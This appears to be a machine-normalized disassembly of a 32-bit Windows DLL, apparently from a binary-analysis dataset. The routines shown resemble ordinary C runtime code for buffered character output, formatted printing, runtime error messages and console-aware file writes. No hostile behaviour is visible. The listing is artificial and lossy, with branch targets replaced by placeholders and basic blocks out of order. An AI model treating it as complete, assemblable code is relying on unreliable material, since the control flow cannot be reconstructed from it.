mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_10030cf5
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_10031f47
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_1002d4db
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_1002d4db
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_1002a56e
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_100326ac
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
cmp edi ebx
mov [ esi + 0x4 ] ecx
jle r-xdata
push [ ebp + 0xc ]
call sub_10038b70
pop ecx
test eax eax
jne r-xdata
call sub_1002a56e
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_100326ac
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_10032788
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_10038a57
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_10030e59
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_10030cf5
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_10030e8c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_10030e59
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_10030eb2
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x24c ] esi
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x238 ] eax
call sub_1002a8c8
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_1002d4db
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10027801
add esp 0x14
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_10031f47
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x220 ] ecx
mov [ ebp - 0x244 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
cmp [ ebp - 0x228 ] 0x0
mov [ ebp - 0x23c ] ebx
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov al dl
sub al 0x20
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor esi esi
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
xor esi esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x23c ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x26c ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x26c ]
mov edi [ ebp - 0x224 ]
mov dl al
jmp r-xdata
sub_10031a4a
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
cmp edi ebx
je r-xdata
call sub_1002d4db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp edi eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop ebx
leave
retn
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] edi
call sub_1002d4db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
cmp eax ebx
jl r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi - 0x1 ] bl
setge al
dec eax
dec eax
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_10030cf5
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_10031b16
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
call sub_1002d4db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_1002d4db
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] ebx
ja r-xdata
pop ebx
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10027801
add esp 0x14
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_10038dc0
call sub_10031a4a
add esp 0x18
cmp eax ebx
jge r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ esi ] bl
pop esi
call sub_1002d4db
mov [ eax ] 0x22
sub_10031b9e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
xor esi esi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jae r-xdata
inc edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x3
call sub_10039af9
pop ecx
cmp eax 0x1
je r-xdata
cmp ebx [ edi * 8 + rw-data ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
push 0x3
call sub_10039af9
pop ecx
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea esi [ edi * 8 + rw-data ]
push [ esi ]
call sub_10027160
pop ecx
push eax
push [ esi ]
push ebx
call [ WriteFile@IAT ]
push r--data
mov ebx 0x314
push ebx
mov edi rw-data
push edi
call sub_1002e87c
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rw-data
push esi
push 0x0
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_100276d9
add esp 0x14
push esi
call sub_10027160
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push 0x2fb
push esi
call sub_1002e87c
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_10027160
sub esi 0x3b
add eax esi
push 0x3
mov ecx rw-data
push r--data
sub ecx eax
push ecx
push eax
call sub_1003686b
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100276d9
add esp 0x14
mov eax [ ebp - 0x4 ]
push [ eax * 8 + rw-data ]
push ebx
push edi
call sub_100367f7
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_100276d9
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_100276d9
add esp 0x14
jmp r-xdata
push 0x12010
push r--data
push edi
call sub_10039990
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_100276d9
add esp 0x14
push r--data
push ebx
push edi
call sub_100367f7
add esp 0xc
test eax eax
je r-xdata
sub_10031d49
push 0x3
call sub_10039af9
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_10031b9e
push 0xff
call sub_10031b9e
pop ecx
pop ecx
push 0x3
call sub_10039af9
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_10031d82
mov edi edi
push ebp
mov ebp esp
sub esp 0x94
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x18 ]
xor ebx ebx
cmp [ ebp + 0xc ] 0x1
push edi
mov [ ebp - 0x8c ] eax
mov [ ebp - 0x94 ] esi
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
push ebx
push 0x80
lea edi [ ebp - 0x84 ]
mov ecx edi
push ecx
push [ ebp + 0x14 ]
mov [ ebp - 0x88 ] ebx
push [ ebp + 0x10 ]
push eax
call sub_10039cb7
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
or eax 0xffffffff
push ebx
push 0x4
mov edi rw-data
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_10039b44
add esp 0x18
test eax eax
je r-xdata
push 0x1
push esi
call sub_1002ddf5
pop ecx
pop ecx
mov ecx [ ebp - 0x94 ]
mov [ ecx ] eax
cmp eax ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov [ esi ] bl
lea ecx [ esi - 0x1 ]
push ecx
push edi
push esi
push eax
call sub_1003686b
add esp 0x10
test eax eax
je r-xdata
cmp [ ebp - 0x88 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8c ]
call sub_10039cb7
add esp 0x18
mov [ ebp - 0x90 ] eax
cmp eax ebx
je r-xdata
xor eax eax
jmp r-xdata
mov al [ esi ]
mov cl 0xa
imul cl
add al bl
sub al 0x30
inc edi
inc edi
cmp edi rw-data
mov [ esi ] al
jl r-xdata
cmp [ ebp - 0x88 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100276d9
add esp 0x14
push edi
call sub_10027a85
pop ecx
xor esi esi
inc esi
push esi
push eax
call sub_1002ddf5
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
mov bl [ edi ]
movzx eax bl
push eax
call sub_1002aa9e
pop ecx
test eax eax
je r-xdata
jmp r-xdata
push edi
call sub_10027a85
pop ecx
push ebx
push [ ebp - 0x90 ]
mov [ ebp - 0x88 ] esi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8c ]
call sub_10039cb7
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
sub_10031f10
mov edi edi
push esi
call sub_1002f0c0
mov esi eax
test esi esi
jne r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
call sub_1002d4db
mov [ eax ] 0xc
xor eax eax
pop esi
retn
mov eax [ esi + 0x44 ]
pop esi
retn
push 0x24
call sub_1002ddb0
pop ecx
mov [ esi + 0x44 ] eax
test eax eax
je r-xdata
sub_10031f47
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0x10 ]
call sub_1002d4db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
sub_10031f79
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_1002e680
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
xor esi esi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] esi
mov [ ebp - 0x1ad0 ] esi
cmp [ ebp + 0x10 ] esi
jne r-xdata
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
lea esi [ eax * 4 + rw-data ]
mov eax [ esi ]
and edi 0x1f
shl edi 0x6
add eax edi
mov bl [ eax + 0x24 ]
add bl bl
sar bl 0x1
mov [ ebp - 0x1ad8 ] esi
mov [ ebp - 0x1ad9 ] bl
cmp bl 0x2
je r-xdata
call sub_1002d4ee
mov [ eax ] esi
call sub_1002d4db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10027150
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
call sub_1002d4ee
xor esi esi
mov [ eax ] esi
call sub_1002d4db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10038b70
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_100389d2
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop edi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad4 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
test bl bl
jne r-xdata
call sub_1002f139
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae4 ]
sete cl
push eax
mov eax [ esi ]
push [ edi + eax ]
mov [ ebp - 0x1ae0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
mov [ ebp - 0x1abc ] eax
cmp bl 0x2
jne r-xdata
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
xor ecx ecx
cmp [ ebp - 0x1ae0 ] ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
jmp r-xdata
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae4 ] eax
xor eax eax
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
test bl bl
je r-xdata
mov esi [ ebp - 0x1ad8 ]
push 0x5
pop esi
cmp [ ebp - 0x1ac0 ] esi
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
jmp r-xdata
call sub_1002d4db
mov [ eax ] 0x1c
call sub_1002d4ee
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1ac4 ]
and [ ebp - 0x1abc ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
mov [ ebp - 0x1abc ] eax
mov eax [ esi ]
add eax edi
test [ eax + 0x4 ] 0x80
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_1002d501
pop ecx
jmp r-xdata
call sub_1002d4db
mov [ eax ] 0x9
call sub_1002d4ee
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1abc ]
movzx edx [ edx ]
add [ ebp - 0x1abc ] esi
add ecx esi
cmp dx 0xa
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
xor eax eax
jmp r-xdata
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1ac4 ]
inc [ ebp - 0x1ac4 ]
mov dl [ edx ]
inc ecx
cmp dl 0xa
jne r-xdata
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1ad8 ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae0 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac4 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac4 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac4 ] esi
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
add [ ebp - 0x1abc ] 0x2
movzx edx [ edx ]
inc ecx
inc ecx
cmp dx 0xa
jne r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
mov [ eax ] dl
inc eax
inc [ ebp - 0x1abc ]
cmp [ ebp - 0x1abc ] 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc [ ebp - 0x1abc ]
movzx esi [ ebx ]
xor ecx ecx
cmp si 0xa
sete cl
inc ebx
inc ebx
add [ ebp - 0x1abc ] 0x2
mov [ ebp - 0x1ac0 ] esi
mov [ ebp - 0x1ae0 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_10037a7d
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
add esi [ ebp - 0x1ad4 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
add [ ebp - 0x1ac4 ] 0x2
mov [ eax ] dx
inc eax
inc eax
cmp [ ebp - 0x1ac4 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] 0x2
push 0xd
pop ebx
mov [ eax ] bx
inc eax
inc eax
add [ ebp - 0x1ac4 ] 0x2
mov eax [ ebp - 0x1ac4 ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp - 0x1ac0 ]
call sub_10039cf4
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1ac0 ]
push eax
call sub_10039ed0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1abc ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1ac0 ]
push ecx
push eax
push [ ebp - 0x1ae4 ]
inc ebx
inc [ ebp - 0x1abc ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1ac0 ]
push ebx
push eax
call sub_10039ed0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac0 ] eax
call sub_10039cf4
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
mov al [ ebp - 0x1ad9 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1abc ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1abc ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
cmp [ ebp - 0x1ac4 ] esi
mov [ ebp - 0x1ac8 ] eax
jl r-xdata
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_100326ac
push 0x10
push r--data
call sub_1002fdfc
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_1002d4ee
and [ eax ] 0x0
call sub_1002d4db
mov [ eax ] 0x9
call sub_1002d4ee
mov [ eax ] edi
call sub_1002d4db
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_10027801
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_1002fe41
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_1003a068
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1002d4db
mov [ eax ] 0x9
call sub_1002d4ee
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10031f79
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003277e
mov eax [ ebp - 0x1c ]
sub_10032788
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_1002ddb0
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_100327d1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_1002d4db
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_10032788
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
